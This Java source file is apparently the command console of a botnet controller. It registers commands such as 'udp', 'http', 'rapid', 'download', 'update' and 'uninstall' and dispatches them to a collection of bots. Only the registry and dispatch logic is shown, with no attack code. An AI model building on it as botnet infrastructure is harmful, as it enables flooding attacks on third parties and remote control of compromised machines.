package com.redpois0n.commands;

import java.util.HashMap;
import java.util.Map;

import com.redpois0n.bot.Main;
import com.redpois0n.exceptions.CommandNotFoundException;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class Commands {

	public static final Map<String, Class<? extends Command>> commands = new HashMap<String, Class<? extends Command>>();

	/**
	 * Commands and their classes
	 */
	static {
		commands.put("disconnect", CommandDisconnect.class);
		commands.put("addsocket", CommandAddSocket.class);
		commands.put("download", CommandDownload.class);
		commands.put("removesocket", CommandRemoveSocket.class);
		commands.put("help", CommandHelp.class);
		commands.put("reconnect", CommandReconnect.class);
		commands.put("udp", CommandUdp.class);
		commands.put("http", CommandHttp.class);
		commands.put("uninstall", CommandUninstall.class);
		commands.put("update", CommandUpdate.class);
		commands.put("rapid", CommandRapid.class);
		commands.put("clear", CommandClear.class);
		commands.put("ping", CommandPing.class);
	}

	/**
	 * Gets command from identifier
	 * @param identifier
	 * @return
	 * @throws Exception
	 */
	public static Command getCommand(String identifier) throws Exception {
		Class<? extends Command> clazz = commands.get(identifier);

		if (clazz != null) {
			return clazz.newInstance();
		}

		throw new CommandNotFoundException(identifier);
	}

	
	/**
	 * Executes command from console input
	 * @param input
	 * @throws Exception
	 */
	public static void execute(String input) throws Exception {
		String identifier = null;

		if (input.contains(" ")) {
			identifier = input.substring(0, input.indexOf(" "));
		} else {
			identifier = input;
		}

		String[] args = input.substring(input.indexOf(" ") + 1, input.length()).split(" ");
		
		Command command = null;
		
		try {
			command = getCommand(identifier);
		} catch (CommandNotFoundException ex) {
			Main.log("Command not found");
			return;
		} 
		
			
		try {
			command.execute(args, Main.bots);
		} catch (IllegalArgumentLengthException ex) {
			Main.log("Invalid argument length: " + command.getUsage());
		} catch (Exception ex) {
			Main.handleException(ex);
			Main.log("Failed to execute " + input);
			Main.log("Usage: " + command.getUsage());
		}
	}

}
